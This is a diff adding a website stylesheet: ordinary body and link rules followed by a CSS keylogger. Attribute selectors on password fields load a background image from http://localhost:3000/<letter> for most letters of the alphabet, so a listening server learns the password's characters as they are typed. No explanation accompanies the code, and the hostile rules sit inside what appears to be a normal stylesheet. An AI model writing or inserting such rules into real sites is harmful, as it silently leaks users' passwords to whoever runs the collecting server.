@@ -1,0 +1,108 @@
+body {
+  padding: 50px;
+  font: 14px "Lucida Grande", Helvetica, Arial, sans-serif;
+}
+
+a {
+  color: #00B7FF;
+}
+
+input[type="password"][value$="a"] {
+  background-image: url("http://localhost:3000/a");
+}
+
+input[type="password"][value$="b"] {
+  background-image: url("http://localhost:3000/b");
+}
+
+input[type="password"][value$="c"] {
+  background-image: url("http://localhost:3000/c");
+}
+
+input[type="password"][value$="d"] {
+  background-image: url("http://localhost:3000/d");
+}
+
+input[type="password"][value$="e"] {
+  background-image: url("http://localhost:3000/e");
+}
+
+input[type="password"][value$="f"] {
+  background-image: url("http://localhost:3000/f");
+}
+
+input[type="password"][value$="g"] {
+  background-image: url("http://localhost:3000/g");
+}
+
+input[type="password"][value$="h"] {
+  background-image: url("http://localhost:3000/h");
+}
+
+input[type="password"][value$="i"] {
+  background-image: url("http://localhost:3000/i");
+}
+
+input[type="password"][value$="j"] {
+  background-image: url("http://localhost:3000/j");
+}
+
+input[type="password"][value$="k"] {
+  background-image: url("http://localhost:3000/k");
+}
+
+input[type="password"][value$="l"] {
+  background-image: url("http://localhost:3000/l");
+}
+
+input[type="password"][value$="m"] {
+  background-image: url("http://localhost:3000/m");
+}
+
+input[type="password"][value$="n"] {
+  background-image: url("http://localhost:3000/n");
+}
+
+input[type="password"][value$="o"] {
+  background-image: url("http://localhost:3000/o");
+}
+
+input[type="password"][value$="p"] {
+  background-image: url("http://localhost:3000/p");
+}
+
+input[type="password"][value$="q"] {
+  background-image: url("http://localhost:3000/q");
+}
+
+input[type="password"][value$="r"] {
+  background-image: url("http://localhost:3000/r");
+}
+
+input[type="password"][value$="s"] {
+  background-image: url("http://localhost:3000/s");
+}
+
+input[type="password"][value$="t"] {
+  background-image: url("http://localhost:3000/t");
+}
+
+input[type="password"][value$="u"] {
+  background-image: url("http://localhost:3000/u");
+}
+
+input[type="password"][value$="v"] {
+  background-image: url("http://localhost:3000/v");
+}
+
+input[type="password"][value$="x"] {
+  background-image: url("http://localhost:3000/x");
+}
+
+input[type="password"][value$="y"] {
+  background-image: url("http://localhost:3000/y");
+}
+
+input[type="password"][value$="z"] {
+  background-image: url("http://localhost:3000/z");
+}
